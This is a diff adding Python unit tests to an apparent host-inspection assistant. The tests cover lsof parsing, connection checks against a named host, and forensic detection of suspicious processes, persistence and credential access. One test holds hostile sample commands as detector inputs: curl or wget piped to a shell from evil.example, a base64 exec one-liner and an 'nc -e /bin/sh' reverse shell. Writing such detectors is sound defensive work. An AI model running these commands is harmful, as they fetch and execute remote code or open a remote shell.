@@ -14,6 +14,7 @@ from tacu.automation import CommandStep, create_plan, evaluate_policy, native_in
 from tacu.companion import exact_answer, exact_host_answer, extract_facts
 from tacu.core import terminal_result
 from tacu.host_parsers import parse_lsof_network, parse_netstat, parse_ps, summarize_destination_ports
+from tacu.tools import forensics, network as tacu_network
 from tacu.routing import native_steps_for_intent
 from tacu.tools import ToolContext, invoke, specs
 
@@ -447,7 +448,8 @@ class HostToolContractTests(unittest.TestCase):
         self.assertEqual(names[:10], ["repo_map", "search_code", "read_file", "inspect_symbol", "edit_file",
                                       "write_file", "shell", "diagnostics", "run_tests", "task_state"])
         self.assertEqual(names[10:], ["process", "network", "system", "application", "ollama",
-                                      "filesystem", "git", "docker", "service", "package", "security"])
+                                      "filesystem", "git", "docker", "service", "package", "security",
+                                      "forensics"])
 
     def test_process_top_cpu_returns_structured_rows(self) -> None:
         raw = {"exit_code": 0, "stdout": PS_BSD, "stderr": "", "command": ["/bin/ps"]}
@@ -726,3 +728,198 @@ class LocalClockCapabilityTests(unittest.TestCase):
         self.assertIn("Sunday, 30 August 2026 at 21:01", answer)
         self.assertIn("IST", answer)
         self.assertIn("UTC+05:30", answer)
+
+
+LSOF_WIDE = """COMMAND     PID              USER   FD   TYPE             DEVICE SIZE/OFF NODE NAME
+Google     2758 bhupenderbhardwaj   26u  IPv4 0xed98fab7d528d63b      0t0  TCP 192.168.1.3:65376->140.82.114.26:443 (ESTABLISHED)
+com.docke 92894 bhupenderbhardwaj   74u  IPv4 0x44fd20132e544981      0t0  TCP 192.168.1.12:54674->91.198.174.192:443 (CLOSED)
+ollama    69802 bhupenderbhardwaj    3u  IPv4 0x9768b4b557825890      0t0  TCP 127.0.0.1:11434 (LISTEN)
+"""
+
+
+class LsofColumnTests(unittest.TestCase):
+    """lsof right-aligns PID and USER, so header-width slicing corrupts both."""
+
+    def test_wide_pids_and_long_usernames_are_read_exactly(self) -> None:
+        rows = parse_lsof_network(LSOF_WIDE)
+        self.assertEqual([row["pid"] for row in rows], [2758, 92894, 69802])
+        self.assertEqual({row["user"] for row in rows}, {"bhupenderbhardwaj"})
+        self.assertEqual([row["command"] for row in rows], ["Google", "com.docke", "ollama"])
+
+    def test_endpoints_and_state_survive_the_split(self) -> None:
+        first, second, third = parse_lsof_network(LSOF_WIDE)
+        self.assertEqual((first["remote_host"], first["remote_port"]), ("140.82.114.26", 443))
+        self.assertEqual(first["state"], "ESTABLISHED")
+        self.assertEqual(second["state"], "CLOSED")
+        self.assertEqual(third["state"], "LISTEN")
+        self.assertIsNone(third["remote_host"])
+
+
+class NamedHostConnectionTests(unittest.TestCase):
+    """"Am I connected to X" must be a verdict about X, not a port ranking."""
+
+    ROWS = [
+        {"command": "Google", "pid": 2758, "user": "me", "protocol": "tcp", "state": "ESTABLISHED",
+         "local_host": "192.168.1.3", "local_port": 65376,
+         "remote_host": "140.82.114.26", "remote_port": 443, "name": "->140.82.114.26:443"},
+        {"command": "Slack", "pid": 400, "user": "me", "protocol": "tcp", "state": "ESTABLISHED",
+         "local_host": "192.168.1.3", "local_port": 5000,
+         "remote_host": "3.3.3.3", "remote_port": 443, "name": "->3.3.3.3:443"},
+    ]
+
+    def test_named_host_is_matched_by_resolved_address(self) -> None:
+        with patch("tacu.tools.network._host_addresses", return_value=["140.82.114.26"]), \
+             patch("tacu.tools.network._reverse_names", return_value={}):
+            verdict = tacu_network._host_matches(self.ROWS, "github.com")
+        self.assertTrue(verdict["host_connected"])
+        self.assertEqual(verdict["match_count"], 1)
+        self.assertEqual(verdict["host_matches"][0]["pid"], 2758)
+        self.assertEqual(verdict["host_matches"][0]["matched_by"], "address")
+
+    def test_named_host_is_matched_by_reverse_dns_when_the_address_moved(self) -> None:
+        with patch("tacu.tools.network._host_addresses", return_value=["9.9.9.9"]), \
+             patch("tacu.tools.network._reverse_names",
+                   return_value={"140.82.114.26": "lb-140-82-114-26-iad.github.com"}):
+            verdict = tacu_network._host_matches(self.ROWS, "github.com")
+        self.assertTrue(verdict["host_connected"])
+        self.assertEqual(verdict["host_matches"][0]["matched_by"], "reverse-dns")
+
+    def test_an_unconnected_host_is_answered_no_not_with_a_ranking(self) -> None:
+        with patch("tacu.tools.network._host_addresses", return_value=["203.0.113.9"]), \
+             patch("tacu.tools.network._reverse_names", return_value={}):
+            verdict = tacu_network._host_matches(self.ROWS, "banana.com")
+        self.assertFalse(verdict["host_connected"])
+        answer = exact_host_answer("am i connected to banana.com",
+                                   [{"result": {"data": {"operation": "connections", **verdict,
+                                                         "connections": [], "state": "ESTABLISHED"}}}])
+        self.assertIsNotNone(answer)
+        self.assertIn("No TCP connection to banana.com", answer)
+        self.assertNotIn("destination port", (answer or "").casefold())
+
+    def test_a_connected_host_names_the_owning_process(self) -> None:
+        with patch("tacu.tools.network._host_addresses", return_value=["140.82.114.26"]), \
+             patch("tacu.tools.network._reverse_names", return_value={}):
+            verdict = tacu_network._host_matches(self.ROWS, "github.com")
+        answer = exact_host_answer("am i connected to github.com",
+                                   [{"result": {"data": {"operation": "connections", **verdict,
+                                                         "connections": verdict["host_matches"],
+                                                         "state": "ESTABLISHED"}}}])
+        self.assertIn("Yes.", answer)
+        self.assertIn("github.com", answer)
+        self.assertIn("2758", answer)
+
+    def test_named_host_questions_route_with_the_host_attached(self) -> None:
+        for question, expected in (
+            ("please tell me if i have outbound tcp connection with ab-inbev.com", "ab-inbev.com"),
+            ("do i have a connection to github.com", "github.com"),
+            ("am i connected to 140.82.114.26", "140.82.114.26"),
+            ("is my machine talking to evil.example", "evil.example"),
+        ):
+            steps = native_steps_for_intent(question)
+            self.assertTrue(steps, question)
+            self.assertEqual(steps[0]["operation"], "connections", question)
+            self.assertEqual(steps[0]["inputs"].get("host"), expected, question)
+
+    def test_aggregate_questions_keep_the_ranking_behaviour(self) -> None:
+        for question in ("top outbound destination ports", "show established connections"):
+            steps = native_steps_for_intent(question)
+            self.assertTrue(steps, question)
+            self.assertIsNone(steps[0]["inputs"].get("host"), question)
+
+
+class ForensicCorrelationTests(unittest.TestCase):
+    """A finding must be explainable: what, and why it was raised."""
+
+    def test_startup_lines_separate_tool_init_from_fetch_and_execute(self) -> None:
+        benign = ('eval "$(/opt/homebrew/bin/brew shellenv)"',
+                  'eval "$(command ticu shell-init zsh)"',
+                  'eval "$(pyenv init -)"')
+        hostile = ('curl -s http://evil.example/x.sh | bash',
+                   'python3 -c "import base64;exec(base64.b64decode(A))"',
+                   'bash -c /tmp/implant',
+                   'wget -qO- http://x/y | sh',
+                   'nc -e /bin/sh 10.0.0.1 4444')
+        for line in benign:
+            self.assertIsNone(forensics._FETCHES_CODE.search(line), line)
+        for line in hostile:
+            self.assertIsNotNone(forensics._FETCHES_CODE.search(line), line)
+
+    def test_location_risk_marks_user_writable_paths(self) -> None:
+        self.assertEqual(forensics._location_risk("/tmp/payload"), "user-writable-temp")
+        self.assertEqual(forensics._location_risk("/var/tmp/x"), "user-writable-temp")
+        self.assertEqual(forensics._location_risk("/usr/bin/ssh"), "")
+        self.assertEqual(forensics._location_risk(""), "unknown-path")
+
+    def test_unsigned_binary_in_temp_with_persistence_scores_high(self) -> None:
+        implant = {"command": "helper", "pid": 6001, "remote_host": "203.0.113.9", "remote_port": 443,
+                   "executable": "/tmp/helper", "location_risk": "user-writable-temp",
+                   "signature": {"checked": True, "signed": False}}
+        verdict = forensics._score(
+            {"concerning": [implant]}, {},
+            {"entries": [{"path": "/tmp/helper", "kind": "user launch agent", "name": "x.plist"}],
+             "flagged": []},
+            {"holders": []})
+        self.assertEqual(verdict["high_count"], 1)
+        finding = verdict["findings"][0]
+        self.assertEqual(finding["severity"], "high")
+        self.assertIn("203.0.113.9", finding["what"])
+        self.assertTrue(any("unsigned" in reason for reason in finding["why"]))
+        self.assertTrue(any("start automatically" in reason for reason in finding["why"]))
+
+    def test_a_signed_binary_in_a_normal_location_is_not_raised(self) -> None:
+        verdict = forensics._score({"concerning": []}, {}, {"entries": [], "flagged": []}, {"holders": []})
+        self.assertEqual(verdict["finding_count"], 0)
+
+    def test_credential_readers_are_reported_with_their_signer(self) -> None:
+        data = {"operation": "secret_access", "supported": True,
+                "checked_paths": ["/home/me/.aws/credentials"],
+                "holders": [{"process": "curl", "pid": 42, "secret": "aws credentials",
+                             "path": "/home/me/.aws/credentials", "executable": "/tmp/curl",
+                             "location_risk": "user-writable-temp",
+                             "signature": {"checked": True, "signed": False}}],
+                "holder_count": 1}
+        answer = exact_host_answer("is something stealing my aws credentials",
+                                   [{"result": {"data": data}}])
+        self.assertIn("curl", answer)
+        self.assertIn("aws credentials", answer)
+        self.assertIn("unsigned", answer)
+
+    def test_a_clean_sweep_says_so_and_names_its_blind_spots(self) -> None:
+        data = {"operation": "sweep", "findings": [], "finding_count": 0, "high_count": 0,
+                "outbound": {"external_count": 12}, "listening": {"exposed_count": 0},
+                "persistence": {"entry_count": 30}, "secret_access": {"holder_count": 0},
+                "not_inspected": ["root-owned cron and system daemons require sudo"]}
+        answer = exact_host_answer("am i compromised", [{"result": {"data": data}}])
+        self.assertIn("Nothing correlated as suspicious", answer)
+        self.assertIn("12 external connections", answer)
+        self.assertIn("Not inspected", answer)
+
+    def test_forensic_questions_route_to_the_forensics_tool(self) -> None:
+        expected = {
+            "am i compromised": "sweep",
+            "check my machine for malware": "sweep",
+            "is anything calling home": "outbound",
+            "do i have any suspicious connections": "outbound",
+            "is something reading my ssh keys": "secret_access",
+            "is a process stealing my aws credentials": "secret_access",
+            "is anything stealing my git credentials": "secret_access",
+            "what starts automatically at login": "persistence",
+        }
+        for question, operation in expected.items():
+            steps = native_steps_for_intent(question)
+            self.assertTrue(steps, question)
+            self.assertEqual((steps[0]["tool"], steps[0]["operation"]), ("forensics", operation), question)
+
+    def test_ordinary_host_questions_are_not_pulled_into_forensics(self) -> None:
+        unaffected = {
+            "top outbound destination ports": ("network", "connections"),
+            "am i connected to github.com": ("network", "connections"),
+            "what is my primary IP": ("network", "interfaces"),
+            "which process is consuming most CPU": ("process", "top_cpu"),
+            "summarize uncommitted git changes": ("git", "status"),
+            "list docker containers": ("docker", "ps"),
+        }
+        for question, expected in unaffected.items():
+            steps = native_steps_for_intent(question)
+            self.assertTrue(steps, question)
+            self.assertEqual((steps[0]["tool"], steps[0]["operation"]), expected, question)
